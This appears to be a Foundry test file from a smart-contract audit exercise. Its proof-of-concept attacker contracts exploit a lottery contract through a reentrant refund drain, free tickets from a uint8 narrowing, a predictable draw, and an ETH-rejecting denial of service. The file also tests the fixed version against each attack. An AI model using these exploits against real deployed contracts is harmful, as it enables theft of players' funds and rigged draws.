// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {LuckyPot} from "../src/LuckyPot.sol";
import {LuckyPotFixed} from "../solution/LuckyPotFixed.sol";

contract ReentrantRefunder {
    LuckyPot immutable pot;
    uint256 immutable roundId;

    constructor(LuckyPot p, uint256 id) {
        pot = p;
        roundId = id;
    }

    function buy() external payable {
        pot.buyTickets{value: msg.value}(1);
    }

    function attack() external {
        pot.claimRefund(roundId);
    }

    receive() external payable {
        if (address(pot).balance >= pot.ticketPrice()) pot.claimRefund(roundId);
    }
}

contract SeedPredictor {
    LuckyPot immutable pot;

    constructor(LuckyPot p) {
        pot = p;
    }

    function buy() external payable {
        pot.buyTickets{value: msg.value}(1);
    }

    /// Calls draw() only when the same formula points at a ticket that this contract owns.
    function drawIfIWin(uint256 myFirstTicket, uint256 myLastTicket) external {
        uint256 roundId = pot.currentRoundId();
        (, , , uint256 sold, ) = pot.rounds(roundId);
        uint256 ticket = uint256(keccak256(abi.encode(blockhash(block.number - 1), block.timestamp, roundId, sold))) % sold;
        require(ticket >= myFirstTicket && ticket <= myLastTicket, "not this block");
        pot.draw();
    }

    function claim() external {
        pot.claimPrize();
    }

    receive() external payable {}
}

contract EtherRejecter {
    function buy(LuckyPot pot) external payable {
        pot.buyTickets{value: msg.value}(1);
    }
    // No receive function: every plain ETH transfer to this contract reverts.
}

contract LuckyPotPoCBase is Test {
    LuckyPot pot;
    address owner = makeAddr("owner");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address carol = makeAddr("carol");
    uint256 constant PRICE = 1 ether;

    function setUp() public virtual {
        vm.warp(1_000_000);
        vm.roll(100);
        vm.prank(owner);
        pot = new LuckyPot(PRICE, 1_000, 2, 1 days); // 10% fee, 2 tickets minimum
        vm.prank(owner);
        pot.openRound();
        vm.deal(alice, 100 ether);
        vm.deal(bob, 100 ether);
        vm.deal(carol, 100 ether);
    }

    function _buy(address who, uint256 quantity) internal {
        vm.prank(who);
        pot.buyTickets{value: quantity * PRICE}(quantity);
    }
}

contract LuckyPotPoC is LuckyPotPoCBase {
    /// LP-01: a cancelled round's refund can be re-entered to drain other players.
    function test_LP01_ReentrantRefundDrainsPot() public {
        _buy(alice, 5);
        _buy(bob, 5);
        ReentrantRefunder attacker = new ReentrantRefunder(pot, 1);
        vm.deal(address(this), 1 ether);
        attacker.buy{value: 1 ether}();
        assertEq(address(pot).balance, 11 ether);

        vm.prank(owner);
        pot.cancelRound();
        attacker.attack();

        assertEq(address(attacker).balance, 11 ether);
        assertEq(address(pot).balance, 0);
    }

    /// LP-02: quantity 256 is priced as uint8(256) == 0 tickets.
    function test_LP02_NarrowingGivesFreeTickets() public {
        _buy(alice, 1);
        vm.prank(bob);
        pot.buyTickets{value: 0}(256);

        assertEq(pot.ticketsOf(1, bob), 256);
        assertEq(pot.chanceBps(1, bob), 9961); // 99.61% chance for 0 ETH
    }

    /// LP-03: the outcome is computable in the same transaction, so a contract draws only when it wins.
    function test_LP03_PredictableDrawAlwaysWins() public {
        _buy(alice, 5);
        _buy(bob, 4);
        SeedPredictor attacker = new SeedPredictor(pot);
        vm.deal(address(this), 1 ether);
        attacker.buy{value: 1 ether}(); // ticket number 9 of 0..9: a 10% honest chance
        vm.warp(block.timestamp + 1 days);

        uint256 attempts;
        while (true) {
            attempts++;
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 12);
            try attacker.drawIfIWin(9, 9) {
                break;
            } catch {
                continue;
            }
        }
        console2.log("blocks waited:", attempts);
        (, , , , address winner) = pot.rounds(1);
        assertEq(winner, address(attacker));
    }

    /// LP-04: one early bird that rejects ETH freezes the whole pot.
    function test_LP04_RejecterBlocksDraw() public {
        EtherRejecter bomb = new EtherRejecter();
        vm.deal(address(this), 1 ether);
        bomb.buy{value: 1 ether}(pot);
        _buy(alice, 5);
        _buy(bob, 5);
        vm.warp(block.timestamp + 1 days);

        vm.expectRevert(LuckyPot.TransferFailed.selector);
        pot.draw();

        // Cancellation is closed too: sales are over and the minimum was reached.
        vm.warp(block.timestamp + 365 days);
        vm.expectRevert(LuckyPot.CannotCancelYet.selector);
        vm.prank(owner);
        pot.cancelRound();
        assertEq(address(pot).balance, 11 ether);
    }

    /// LP-05: fees stay on the books after the full ticket price is refunded.
    function test_LP05_RefundLeavesFeesUnbacked() public {
        _buy(alice, 1);
        _buy(bob, 1);
        assertEq(pot.accruedFees(), 0.2 ether);

        vm.prank(owner);
        pot.cancelRound();
        vm.prank(alice);
        pot.claimRefund(1);
        vm.prank(bob);
        pot.claimRefund(1);

        assertEq(address(pot).balance, 0);
        assertEq(pot.accruedFees(), 0.2 ether); // the books promise 0.2 ETH that does not exist
        vm.prank(owner);
        vm.expectRevert(LuckyPot.TransferFailed.selector);
        pot.withdrawFees(owner);
    }

    /// LP-05 (second path): refunds use the current price, not the price paid.
    function test_LP05b_RefundUsesCurrentPrice() public {
        _buy(alice, 1);
        vm.prank(owner);
        pot.cancelRound();
        vm.prank(owner);
        pot.setConfig(0.1 ether, 1_000, 2, 1 days);

        uint256 before = alice.balance;
        vm.prank(alice);
        pot.claimRefund(1);
        assertEq(alice.balance - before, 0.1 ether); // Alice paid 1 ETH and gets 0.1 ETH back
    }

    /// LP-06: the winner search walks every entry, so draw() gas grows with the entry count.
    function test_LP06_DrawGasGrowsWithEntries() public {
        uint256 small = _worstCaseDrawGas(100);
        setUp();
        uint256 large = _worstCaseDrawGas(2_000);
        console2.log("draw gas with    100 entries:", small);
        console2.log("draw gas with  2,000 entries:", large);
        console2.log("gas per entry:", (large - small) / 1_900);
        assertGt(large, small * 10);
    }

    function _worstCaseDrawGas(uint256 entries) internal returns (uint256 gasUsed) {
        vm.startPrank(alice);
        vm.deal(alice, entries * PRICE);
        for (uint256 i; i < entries; i++) pot.buyTickets{value: PRICE}(1);
        vm.stopPrank();

        vm.warp(block.timestamp + 1 days);
        // Moves the clock until the winning ticket is the last one: the worst case.
        while (
            uint256(keccak256(abi.encode(blockhash(block.number - 1), block.timestamp, uint256(1), entries))) % entries !=
            entries - 1
        ) vm.warp(block.timestamp + 1);

        vm.cool(address(pot));
        uint256 before = gasleft();
        pot.draw();
        gasUsed = before - gasleft();
    }
}

contract FixedEtherRejecter {
    function buy(LuckyPotFixed pot) external payable {
        pot.buyTickets{value: msg.value}(1);
    }
}

contract FixedRefundAttacker {
    LuckyPotFixed immutable pot;
    bool public reentered;

    constructor(LuckyPotFixed p) {
        pot = p;
    }

    function buy() external payable {
        pot.buyTickets{value: msg.value}(1);
    }

    function attack() external {
        pot.claimRefund(1);
    }

    receive() external payable {
        try pot.claimRefund(1) {
            reentered = true;
        } catch {}
    }
}

contract LuckyPotFixTest is Test {
    LuckyPotFixed pot;
    address owner = makeAddr("owner");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    uint256 constant PRICE = 1 ether;
    bytes32 constant SEED = keccak256("owner secret seed");

    function setUp() public {
        vm.warp(1_000_000);
        vm.startPrank(owner);
        pot = new LuckyPotFixed(PRICE, 1_000, 2, 1 days);
        pot.openRound(keccak256(abi.encode(SEED)));
        vm.stopPrank();
        vm.deal(alice, 100 ether);
        vm.deal(bob, 100 ether);
    }

    function _buy(address who, uint256 quantity) internal {
        vm.prank(who);
        pot.buyTickets{value: quantity * PRICE}(quantity);
    }

    function test_Fix_LP01_ReentryGetsNothingExtra() public {
        _buy(alice, 5);
        FixedRefundAttacker attacker = new FixedRefundAttacker(pot);
        vm.deal(address(this), 1 ether);
        attacker.buy{value: 1 ether}();
        vm.prank(owner);
        pot.cancelRound();
        attacker.attack();
        assertEq(address(attacker).balance, 1 ether);
        assertFalse(attacker.reentered());
        assertEq(address(pot).balance, 5 ether);
    }

    function test_Fix_LP02_ChargesEveryTicket() public {
        vm.prank(bob);
        vm.expectRevert(LuckyPotFixed.WrongPayment.selector);
        pot.buyTickets{value: 0}(256);
        _buy(bob, 100);
        assertEq(pot.paidBy(1, bob), 100 ether);
    }

    function test_Fix_LP03_DrawNeedsCommittedSeed() public {
        _buy(alice, 1);
        _buy(bob, 1);
        vm.warp(block.timestamp + 1 days);
        vm.expectRevert(LuckyPotFixed.BadSeed.selector);
        pot.draw(bytes32(uint256(123)));
        pot.draw(SEED);
    }

    function test_Fix_LP03_UnrevealedSeedCanBeCancelled() public {
        _buy(alice, 1);
        _buy(bob, 1);
        vm.warp(block.timestamp + 2 days);
        pot.cancelRound();
        vm.prank(alice);
        pot.claimRefund(1);
        assertEq(alice.balance, 100 ether);
    }

    function test_Fix_LP04_RejecterCannotBlockDraw() public {
        FixedEtherRejecter bomb = new FixedEtherRejecter(); // no receive function
        vm.deal(address(this), 1 ether);
        bomb.buy{value: 1 ether}(pot);
        _buy(alice, 5);
        _buy(bob, 5);
        vm.warp(block.timestamp + 1 days);
        pot.draw(SEED);
        assertGt(pot.pendingPrize(address(bomb)), 0);
    }

    function test_Fix_LP05_BooksStayBackedAfterRefunds() public {
        _buy(alice, 1);
        _buy(bob, 1);
        assertEq(pot.accruedFees(), 0);
        vm.prank(owner);
        pot.cancelRound();
        vm.prank(alice);
        pot.claimRefund(1);
        vm.prank(bob);
        pot.claimRefund(1);
        assertEq(alice.balance, 100 ether);
        assertEq(address(pot).balance, pot.accruedFees());
    }

    function test_Fix_LP05_SolventAfterSettlement() public {
        _buy(alice, 3);
        _buy(bob, 7);
        vm.warp(block.timestamp + 1 days);
        pot.draw(SEED);
        uint256 owed = pot.accruedFees() + pot.pendingPrize(alice) + pot.pendingPrize(bob);
        assertEq(address(pot).balance, owed);
    }

    function test_Fix_LP06_DrawGasStaysFlat() public {
        vm.deal(alice, 3_000 ether);
        vm.startPrank(alice);
        for (uint256 i; i < 2_000; i++) pot.buyTickets{value: PRICE}(1);
        vm.stopPrank();
        vm.warp(block.timestamp + 1 days);
        vm.cool(address(pot));
        uint256 before = gasleft();
        pot.draw(SEED);
        uint256 used = before - gasleft();
        console2.log("fixed draw gas with 2,000 entries:", used);
        assertLt(used, 300_000);
    }
}
